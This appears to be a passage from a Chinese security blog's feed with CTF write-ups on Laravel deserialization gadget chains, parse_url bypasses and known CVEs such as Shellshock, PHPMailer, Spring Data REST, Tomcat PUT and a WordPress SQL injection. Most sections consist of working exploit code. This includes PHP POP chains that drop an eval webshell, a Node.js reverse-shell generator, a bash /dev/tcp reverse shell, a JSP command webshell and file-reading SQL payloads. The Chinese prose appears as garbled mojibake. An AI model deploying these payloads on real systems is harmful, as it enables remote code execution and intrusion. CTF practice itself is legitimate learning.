</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>Arr::get</code></p>
<pre><code>public static function get($array, $key, $default = null)
    {
        if (is_null($key)) {
            return $array;
        }

        if (isset($array[$key])) {
            return $array[$key];
        }
        ...
</code></pre>
<p>å› ä¸º<code>$name</code>å·²ç»è¢«æˆ‘ä»¬èµ‹å€¼äº†ï¼Œæ‰€ä»¥è®¾ç½®<code>$this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system']</code><br>
<code>$this-&gt;extensions[$payload]='call_user_func';</code><br>
è¿™æ ·å°±æ„é€ å®Œæˆäº†ã€‚</p>
<h2 id="exp-3">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this-&gt;app['config']['database.default'] = $payload;
            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
            $this-&gt;extensions[$payload]='call_user_func';
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Illuminate\Database\DatabaseManager;
    class Deprecated
    {
        protected $description;
        public function __construct($payload)
        {
            $this-&gt;description=new DatabaseManager($payload);
        }
    }
}

namespace {
    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
    class Swift_KeyCache_DiskKeyCache {
        private $_path;
        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
        public function __construct($payload) {
            $this-&gt;_path = new Deprecated($payload);
        }
    }
    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
}
?&gt;
</code></pre>
<p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œä¼šæœ‰æŠ¥é”™ä¿¡æ¯<br>
<img src="https://fallingskies22.github.io/post-images/1724071508888.png" alt="" loading="lazy"></p>
<h2 id="å¦ä¸€æ¡">å¦ä¸€æ¡</h2>
<p>åˆ†æå°±çœç•¥äº†ï¼Œå°±æ˜¯æ”¹äº†__tostringå’Œ__call<br>
è¿™é‡Œæ³¨æ„è°ƒç”¨__callæ—¶æ˜¯èƒ½å¸¦å…¥å‚æ•°çš„ï¼Œè¿™é‡Œ</p>
<pre><code>$method=stringfy
$attributes=$this-&gt;value
</code></pre>
<pre><code class="language-php">&lt;?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this-&gt;formatters = ['stringify' =&gt; &quot;system&quot;];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this-&gt;string = null;
            $this-&gt;util = new Generator();;
            $this-&gt;value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
        public function __construct($payload) {
            $this-&gt;path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;)));
}
?&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724118558197.png" alt="" loading="lazy"></figure>
<p>ä½†æ˜¯æµ‹è¯•å‘ç°<code>Generator</code>ä¸­çš„<code>__call</code>åˆ©ç”¨ä¸äº†ï¼Œå› ä¸ºå·²ç»ä¿®å¤äº†<br>
<code>$this-&gt;formatters</code>ä¼šæ¸…ç©ºï¼Œå¯¼è‡´åé¢åˆ©ç”¨å‚æ•°é“¾æ–­è£‚ã€‚</p>
<pre><code>public function __wakeup()
    {
        $this-&gt;formatters = [];
    }
</code></pre>
<h2 id="å¦å¦ä¸€æ¡">å¦å¦ä¸€æ¡</h2>
<p><code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p>
<pre><code>public function __call($method, $parameters)
    {
        $rule = Str::snake(substr($method, 8));
        echo $rule;
        if (isset($this-&gt;extensions[$rule])) {
            return $this-&gt;callExtension($rule, $parameters);
        }

        throw new BadMethodCallException(&quot;Method [$method] does not exist.&quot;);
    }
</code></pre>
<p>è·Ÿè¿›<code>src/Illuminate/Validation/Validator.php</code>ä¸­çš„<code>__call()</code>æ–¹æ³•ï¼Œå…ˆè¿›è¡Œå­—ç¬¦ä¸²çš„æ“ä½œæˆªå–<code>$method</code>ç¬¬å…«ä¸ªå­—ç¬¦ä¹‹åçš„å­—ç¬¦ï¼Œç”±äºä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯<code>dispatch</code>ï¼Œæ­£å¥½å…«ä¸ªå­—ç¬¦æ‰€ä»¥ä¼ å…¥åä¸ºç©ºï¼Œæ¥ç€è°ƒç”¨<code>callExtension()</code>æ–¹æ³•ï¼Œé€šè¿‡<code>instanceof Closure</code>åˆ¤æ–­ï¼Œè§¦å‘call_user_func_arrayæ–¹æ³•<br>
<img src="https://fallingskies22.github.io/post-images/1724126866932.png" alt="" loading="lazy"></p>
<p>exp</p>
<pre><code class="language-php">&lt;?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this-&gt;extensions = ['' =&gt; 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this-&gt;events = new Validator();
            $this-&gt;event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?&gt;
</code></pre>
<p>ä½†æ˜¯<code>PendingBroadcast</code>è¿™ä¸ªç±»æ²¡æœ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å¦ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„ç±»ï¼Œå¾ˆéš¾ï¼ˆè¿™é‡Œæ²¡æ‰¾åˆ°ï¼‰ã€‚<br>
çœ‹ä¸‹èƒ½å¦åˆ©ç”¨<code>callClassBasedExtension</code>æ–¹æ³•ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç”¨ä¸Šé¢çš„<code>DefaultGenerator</code>æ–¹æ³•ï¼Œå¯ä»¥æ§åˆ¶<code>$this-&gt;container-&gt;make($class)</code>çš„å€¼ï¼Œç„¶å<code>$method</code>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡<code>$callback</code>å‚æ•°æ§åˆ¶ï¼Œ<code>$parameters</code>å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„</p>
<p>ä½†æ˜¯å› ä¸ºè¿™é‡Œä½¿ç”¨çš„æ•°ç»„å½¢å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾å¯ä»¥åˆ©ç”¨çš„<code>$this-&gt;container-&gt;make($class)-&gt;$method($parmeters)</code></p>
<pre><code>    /**
     * Call a class based validator extension.
     *
     * @param  string  $callback
     * @param  array   $parameters
     * @return bool
     */
    protected function callClassBasedExtension($callback, $parameters)
    {
        list($class, $method) = explode('@', $callback);

        return call_user_func_array([$this-&gt;container-&gt;make($class), $method], $parameters);
    }
</code></pre>
<p>è¿™é‡Œæ‰¾åˆ°<code>DebugClassLoader</code>çš„<code>loadClass</code>æ–¹æ³•</p>
<pre><code>public function loadClass($class)
    {
        ErrorHandler::stackErrors();

        try {
            echo &quot;loooooooadclass&quot;;
            if ($this-&gt;isFinder &amp;&amp; !isset($this-&gt;loaded[$class])) {
                $this-&gt;loaded[$class] = true;
                if ($file = $this-&gt;classLoader[0]-&gt;findFile($class)) {
                    require $file;
                }
            } else {
                echo &quot;sssssssssssucccesss&quot;;
                call_user_func($this-&gt;classLoader, $class);
                $file = false;
            }
        } catch (\Exception $e) {
            ErrorHandler::unstackErrors();

            throw $e;
        } catch (\Throwable $e) {
            ErrorHandler::unstackErrors();

            throw $e;
        }
</code></pre>
<p>ç¼–å†™exp</p>
<pre><code class="language-php">&lt;?php
namespace{
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new ObjectStateToken($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;calc&quot;))));
}
namespace Prophecy\Argument\Token{
    use Illuminate\Validation\Validator;
    class ObjectStateToken{
        private $name;
        private $value;
        private $util;
        public function __construct($cmd){
            $this-&gt;name='';
            $this-&gt;value=$cmd;
            $this-&gt;util=new Validator();
        }
    }
}

namespace Illuminate\Validation{
    use Faker\DefaultGenerator;
    class Validator{
        protected $container;
        protected $extensions = [];
        public function __construct(){
            $this-&gt;extensions['y']='xxx@loadClass';
            $this-&gt;container=new DefaultGenerator();
        }
    }
}
namespace Faker{
    use Symfony\Component\Debug\DebugClassLoader;
    class DefaultGenerator
    {
        protected $default;

        public function __construct()
        {
            $this-&gt;default = new DebugClassLoader();
        }
    }
}

namespace Symfony\Component\Debug{
    class DebugClassLoader
    {

        private $classLoader;
        public function __construct()
        {
            $this-&gt;classLoader = &quot;system&quot;;
        }
    }
}
?&gt;
</code></pre>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p>https://www.anquanke.com/post/id/258264#h3-11</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ctfshow]Laravelä¸“é¢˜]]></title>
        <id>https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/</id>
        <link href="https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/">
        </link>
        <updated>2024-08-18T09:00:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="web627">web627</h2>
<p>Laravel 5.1 ååºåˆ—åŒ–é“¾<br>
è¯¦ç»†åˆ†æå‚è€ƒä¸‹ç¯‡æ–‡ç« ã€‚</p>
<p><code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>DefinedTargetClass</code>-&gt;<code>ValidGenerator</code><br>
exp</p>
<pre><code class="language-php">&lt;?php
namespace{
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;array('fallingskies'=&gt;'fallingskies')];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new DefinedTargetClass($cmd);
        }
    }
    echo urlencode((serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
}
namespace Mockery\Generator{
    use Faker\ValidGenerator;
    class DefinedTargetClass
    {
        private $rfc;
        public function __construct($cmd)
        {
            $this-&gt;rfc=new ValidGenerator($cmd);
        }
    }
}
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($cmd)
        {
            $this-&gt;default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($cmd){
            $this-&gt;generator=new DefaultGenerator($cmd);
            $this-&gt;maxRetries=9;
            $this-&gt;validator='system';
        }
    }
}
?&gt;
</code></pre>
<p>å‘é€payloadæ—¶ï¼Œè¿˜éœ€è¦ä¼ ä¸€ä¸ª_tokenå‚æ•°ã€‚<br>
ä»¥åŠæ·»åŠ ä¸€ä¸‹Content-typeå¤´</p>
<pre><code>POST /admin HTTP/1.1
Content-type: application/x-www-form-urlencoded


ctfshow=&amp;_token=LiNQc6R2aiDl95vWsN0ko4SoI96UJ7YRDygskvCL
</code></pre>
<h2 id="web628">web628</h2>
<p>u1s1ï¼Œè¿™ä¸ªæ‹¦æˆªä¸ºå•¥ä¸å†™å‡ºæ¥ï¼Œæ‰¾åŠå¤©å‘ç°ç«Ÿç„¶å†™åœ¨å‡½æ•°é‡Œé¢çš„ï¼Œæ— è¯­ğŸ˜’</p>
<pre><code class="language-php">&lt;?php
class DefinedTargetClass
{
    private $rfc;

    public function __construct(\ReflectionClass $rfc)
    {
        die(&quot;æ­¤é“¾ä¸é€š&quot;);
</code></pre>
<p>DefinedTargetClassè¿™ä¸ªå‡½æ•°è¢«ç¦äº†ï¼ŒValidGeneratorå‡½æ•°ä¹Ÿè¢«ç¦äº†ã€‚<br>
éœ€è¦æ‰¾ä¸€ä¸‹æ–°çš„<code>__tostring</code>å’Œ<code>__call</code>,è¯¦ç»†åˆ†æå‚è€ƒä¸‹ç¯‡æ–‡ç« ã€‚</p>
<p><code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>Deprecated</code>-&gt;<code>DatabaseManager</code></p>
<pre><code class="language-php">&lt;?php
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this-&gt;app['config']['database.default'] = $payload;
            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
            $this-&gt;extensions[$payload]='call_user_func';
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Illuminate\Database\DatabaseManager;
    class Deprecated
    {
        protected $description;
        public function __construct($payload)
        {
            $this-&gt;description=new DatabaseManager($payload);
        }
    }
}

namespace {
    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
    class Swift_KeyCache_DiskKeyCache {
        private $_path;
        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
        public function __construct($payload) {
            $this-&gt;_path = new Deprecated($payload);
        }
    }
    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
}
?&gt;
</code></pre>
<h2 id="web629">web629</h2>
<p>ç»•è¿‡ï¼Œæ¢å¦ä¸€æ¡é“¾<br>
è¯¦ç»†åˆ†æå‚è€ƒä¸‹ç¯‡æ–‡ç« ã€‚<br>
<code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>ObjectStateToken</code>-&gt;<code>Validator</code>-&gt;<code>DebugClassLoader</code></p>
<pre><code class="language-php">&lt;?php
namespace{
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new ObjectStateToken($cmd);
        }
    }
    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;cat /flags_c&quot;)));
}
namespace Prophecy\Argument\Token{
    use Illuminate\Validation\Validator;
    class ObjectStateToken{
        private $name;
        private $value;
        private $util;
        public function __construct($cmd){
            $this-&gt;name='';
            $this-&gt;value=$cmd;
            $this-&gt;util=new Validator();
        }
    }
}

namespace Illuminate\Validation{
    use Faker\DefaultGenerator;
    class Validator{
        protected $container;
        protected $extensions = [];
        public function __construct(){
            $this-&gt;extensions['y']='xxx@loadClass';
            $this-&gt;container=new DefaultGenerator();
        }
    }
}
namespace Faker{
    use Symfony\Component\Debug\DebugClassLoader;
    class DefaultGenerator
    {
        protected $default;

        public function __construct()
        {
            $this-&gt;default = new DebugClassLoader();
        }
    }
}

namespace Symfony\Component\Debug{
    class DebugClassLoader
    {

        private $classLoader;
        public function __construct()
        {
            $this-&gt;classLoader = &quot;system&quot;;
        }
    }
}
?&gt;
</code></pre>
<h2 id="web630">web630</h2>
<p>ä¸Šé¢˜expä¾ç„¶å¯ä»¥</p>
<h2 id="web631">web631</h2>
<p>Laravel7.30 ååºåˆ—åŒ–<br>
ä½¿ç”¨phpgcä¸­çš„RCE8å°±å¯ä»¥</p>
<h2 id="web632">web632</h2>
<p>åŒä¸Š</p>
<h2 id="web633">web633</h2>
<p>è¢«è¿‡æ»¤äº†,æ¢æ¡é“¾<br>
ä¸‹é¢è¿™äº›è¯•äº†éƒ½è¢«è¿‡æ»¤äº†ã€‚</p>
<pre><code>RCE2

PendingBroadcast
	Dispatcher


RCE8

FileCookieJar
	RequiredIf
		LazyOption

RCE3

PendingBroadcast
	ChannelManager

RCE4

PendingBroadcast
	Validator
</code></pre>
<p>è¿™ä¸ªæ²¡è¿‡æ»¤ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œæ²¡ç»“æœ</p>
<pre><code>RCE10

RequiredIf
	RequestGuard
</code></pre>
<p>åº”è¯¥æ˜¯è¿‡æ»¤äº†<code>PendingBroadcast</code>å’Œ<code>FileCookieJar</code></p>
<p>ä½¿ç”¨phpgcä¸­çš„RCE16å¯ä»¥</p>
<pre><code>RCE16

RotatingFileHandler
	RequiredIf
		RequestGuard
</code></pre>
<h2 id="web634">web634</h2>
<p>åŒä¸Š</p>
<h2 id="web635">web635</h2>
<p>åŒä¸Š</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PARSE_URLç»•è¿‡æŒ‘æˆ˜]]></title>
        <id>https://fallingskies22.github.io/post/parse_url-rao-guo/</id>
        <link href="https://fallingskies22.github.io/post/parse_url-rao-guo/">
        </link>
        <updated>2024-08-17T03:34:56.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://php.golaravel.com/function.parse-url.html">parse_urlå‡½æ•°ä»‹ç»</a><br>
<a href="https://github.com/php/php-src/blob/8db3d36f2fc7bc440d3a0697a2ce04dca5e73ad1/ext/standard/url.c">æºç </a></p>
<h2 id="challenge1">challenge1</h2>
<pre><code class="language-php">&lt;?php

$data = parse_url($_GET['u']);

eval($data['host']);
</code></pre>
<pre><code>?u=//eval($_GET[1]);/ff&amp;1=system(%27cat%20/flag_is_here.txt%27);
</code></pre>
<h2 id="challenge2">challenge2</h2>
<pre><code class="language-php">&lt;?php

$data = parse_url($_GET['u']);

include $data['host'].$data['path'];
</code></pre>
<pre><code>POST /?u=//php:://input HTTP/1.1

data:/text/plain,&lt;?php system('cat /_f1ag_1s_h3re.txt');?&gt;
</code></pre>
<h2 id="challenge3">challenge3</h2>
<pre><code class="language-php">&lt;?php

$data = parse_url($_GET['u']);

include $data['scheme'].$data['path'];
</code></pre>
<pre><code>POST /?u=php:://input HTTP/1.1

data:/text/plain,&lt;?php system('cat /_f1a_g_1s_h3re');?&gt;
</code></pre>
<p>é™„å¸¦ä¸€ç¯‡<a href="https://www.cnblogs.com/hf99/p/9637354.html">parse_urlæºç è§£æ</a>çš„æ–‡ç« </p>
<h2 id="challenge4">challenge4</h2>
<pre><code class="language-php">&lt;?php

$data = parse_url($_GET['u']);

system($data['host']);
</code></pre>
<p>hostå‚æ•°é‡Œä¸èƒ½æœ‰<code>/</code>ï¼Œéœ€è¦ç”¨å…¶ä»–æ–¹æ³•ç»•è¿‡ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/13829">å‘½ä»¤æ³¨å…¥é™åˆ¶ç»•è¿‡æ€è·¯åˆ¨æ</a></p>
<p>ä½¿ç”¨<code>${HOME:0:1}</code>æ¥æ„é€ <code>/</code></p>
<pre><code>?u=//cat%20${HOME:0:1}1_f1ag_1s_h3re:1
</code></pre>
<h2 id="challenge5">challenge5</h2>
<pre><code class="language-php">&lt;?php

extract(parse_url($_GET['u']));
include $$$$$$host;
</code></pre>
<p>extractä¼šè¦†ç›–å˜é‡ï¼Œç„¶åæˆ‘ä»¬å¤šè®¾ç½®ä¸€äº›å˜é‡ï¼Œè®©å®ƒç»è¿‡äº”æ¬¡è·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„å†…å®¹ã€‚</p>
<pre><code>user://pass:query@scheme/1.html/?fragment#php://input&quot;
</code></pre>
<p>parse_urlè§£æç»“æœ</p>
<pre><code>Array
(
    [scheme] =&gt; user
    [host] =&gt; scheme
    [user] =&gt; pass
    [pass] =&gt; query
    [path] =&gt; /1.html/
    [query] =&gt; fragment
    [fragment] =&gt; php://input
)
</code></pre>
<p>payload</p>
<pre><code>POST /?u=user://pass:query@scheme/1.html/?fragment%23php://input HTTP/1.1

&lt;?php system('cat /_f1ag_1s_h3ree');?&gt;
</code></pre>
<h2 id="challenge6">challenge6</h2>
<pre><code class="language-php">&lt;?php

$data = parse_url($_GET['u']);

file_put_contents($data['path'], $data['host']);
</code></pre>
<p>hosté‡Œä¸èƒ½æœ‰<code>?</code>ï¼Œæ‰€ä»¥ä¸èƒ½å†™å…¥ä¸€èˆ¬çš„phpä»£ç </p>
<p>ä½¿ç”¨<code>&lt;script language='php'&gt;</code>æ ¼å¼æ¥ç»•è¿‡ã€‚</p>
<pre><code>//&lt;script%20language=%27php%27&gt;eval($_GET[1]);/var/www/html/2.php
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ctfshow]ç»„ä»¶æ¼æ´]]></title>
        <id>https://fallingskies22.github.io/post/ctfshowzu-jian-lou-dong/</id>
        <link href="https://fallingskies22.github.io/post/ctfshowzu-jian-lou-dong/">
        </link>
        <updated>2024-08-14T10:14:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="web580">web580</h2>
<p>æ ¹æ®æç¤ºå‘ç°<a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash Shellshock ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰</a></p>
<p>payload</p>
<pre><code>User-Agent:() { :; }; echo; /bin/cat /flag
</code></pre>
<h2 id="web581">web581</h2>
<p>å‚è€ƒæ–‡ç« <br>
<a href="https://paper.seebug.org/334">CVE-2017-6920:Drupalè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æåŠPOCæ„é€ </a></p>
<p>æ„é€ ååºåˆ—åŒ–payload</p>
<pre><code class="language-php">&lt;?php

class log{
    public $filename;
    public $content;
    public function __construct($n,$c){
        $this-&gt;filename=$n;
        $this-&gt;content=$c;
    }
    public function __destruct(){
        file_put_contents($this-&gt;filename, $this-&gt;content);
    }
}

echo(serialize(new log(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;)));
</code></pre>
<p>payload</p>
<pre><code>content=!php/object O:3:&quot;log&quot;:2:{s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;;}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723632473882.png" alt="" loading="lazy"></figure>
<h2 id="web582">web582</h2>
<p>å‚è€ƒæ–‡ç« <a href="http://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">node-serializeååºåˆ—åŒ–æ¼æ´</a></p>
<p>poc</p>
<pre><code class="language-js">var y = {
	poc : function(){
		require('child_process').exec('env', function(error, stdout, stderr){ console.log(stdout) });
	}
}
var s = require('node-serialize');
console.log(&quot;Serialized:\n&quot; + s.serialize(y));
</code></pre>
<p>nodejsæ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾</p>
<p>ä½¿ç”¨nodejsshell.py(éœ€è¦python2ç¯å¢ƒ)</p>
<pre><code class="language-python">import sys

if len(sys.argv) != 3:
    print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    &quot;&quot;&quot;String.CharCode&quot;&quot;&quot;
    encoded = ''
    for char in string:
        encoded = encoded + &quot;,&quot; + str(ord(char))
    return encoded[1:]

print &quot;[+] LHOST = %s&quot; % (IP_ADDR)
print &quot;[+] LPORT = %s&quot; % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST=&quot;%s&quot;;
PORT=&quot;%s&quot;;
TIMEOUT=&quot;5000&quot;;
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write(&quot;Connected!\\n&quot;);
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end(&quot;Disconnected!\\n&quot;);
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)



print &quot;[+] Encoding&quot;
PAYLOAD = charencode(NODEJS_REV_SHELL)
print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)
</code></pre>
<p>å°†è„šæœ¬ç”ŸæˆpayloadåŠ å…¥ä¸‹æ–¹<code>payload</code>å¤„ï¼Œéœ€è¦åœ¨usernameå‚æ•°æœ€åæ‰‹åŠ¨æ·»åŠ æ‹¬å·</p>
<pre><code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function(){payload}()&quot;,&quot;password&quot;:&quot;123&quot;}
</code></pre>
<p>base64ç¼–ç åï¼Œå‘é€<br>
<img src="https://fallingskies22.github.io/post-images/1723655653934.png" alt="" loading="lazy"></p>
<p>vpsæ”¶åˆ°åå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤å³å¯ã€‚</p>
<h2 id="web583">web583</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2016-10033ï¼‰åˆ†æ</a></p>
<p>ä¸»è¦æ˜¯ç»•è¿‡å¯¹emailæ­£åˆ™çš„æ ¡éªŒï¼Œç„¶ååˆ©ç”¨ç©ºæ ¼æ³¨å…¥sendmailçš„å…¶ä»–å‚æ•°å‘½ä»¤ã€‚</p>
<p>payload</p>
<pre><code>name=&lt;?php%20system('cat%20/flag_is_here');?&gt;&amp;email=&quot;aaa&quot;.%20-OQueueDirectory=/tmp/.%20-X/var/www/html/a.php%20@aaa.com&amp;message=qaz
</code></pre>
<h2 id="web584">web584</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://tech.meituan.com/2017/09/29/spring-data-rest-cve.html">Spring Data REST è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-8046ï¼‰åˆ†æä¸å¤ç°</a></p>
<p>ä½¿ç”¨postæ–¹æ³•åˆ›å»ºä¸€ä¸ªç”¨æˆ·<br>
<img src="https://fallingskies22.github.io/post-images/1723690551582.png" alt="" loading="lazy"></p>
<p>ä½¿ç”¨patchæ–¹æ³•ä¿®æ”¹å†…å®¹ï¼Œéœ€è¦å°†Content-TypeæŒ‡å®šä¸ºapplication/json-patch+json<br>
åœ¨pathå‚æ•°å¤„æ³¨å…¥SpELè¡¨è¾¾å¼ã€‚</p>
<p>åå¼¹shellå‘½ä»¤</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
</code></pre>
<p>ä½¿ç”¨è„šæœ¬ç¼–ç ä¸ºbytecode</p>
<pre><code>payload = b'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}'
bytecode = ','.join(str(i) for i in list(payload))
print(bytecode)
</code></pre>
<p>payload</p>
<pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,57,112,99,67,57,119,98,51,74,48,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname&quot;, &quot;value&quot;: &quot;ctfshow&quot; }]
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723691633100.png" alt="" loading="lazy"></figure>
<h2 id="web585">web585</h2>
<p>å‚è€ƒæ–‡ç« Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´<a href="https://github.com/breaktoprotect/CVE-2017-12615">POC CVE-2017-12615</a></p>
<p>ä¼ ä¸€ä¸ªå°é©¬</p>
<pre><code class="language-java">&lt;%
    if(&quot;1&quot;.equals(request.getParameter(&quot;pwd&quot;))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;p&quot;)).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.print(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723694547014.png" alt="" loading="lazy"></figure>
<h2 id="web586">web586</h2>
<p>å‚è€ƒ<a href="https://www.exploit-db.com/exploits/39896">WordPress Plugin Double Opt-In for Download 2.0.9 - SQL Injection</a></p>
<p>éœ€è¦æ³¨å†Œè´¦å·å¹¶ç™»å½•ã€‚<br>
ä½¿ç”¨<code>load_file</code>è¯»å–<code>/flag_is_here</code></p>
<pre><code>/wp-admin/admin-ajax.php?action=populate_download_edit_form


id=0 UNION SELECT 1, 2, 4, 5, 6, 7, load_file(0x2f666c61675f69735f68657265)
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723716966943.png" alt="" loading="lazy"></figure>
<h2 id="web587">web587</h2>
<p>å‚è€ƒæ–‡ç« [weblogic è¿œç¨‹ä»£ç æ‰§è¡Œ <a href="https://blog.csdn.net/YouthBelief/article/details/121119954">CVE-2019-2725</a></p>
<p>è®¿é—®æ§åˆ¶å°é¡µé¢<code>/console/login/LoginForm.jsp</code><br>
å‘ç°ç‰ˆæœ¬ä¸º<code>10.3.6.0</code></p>
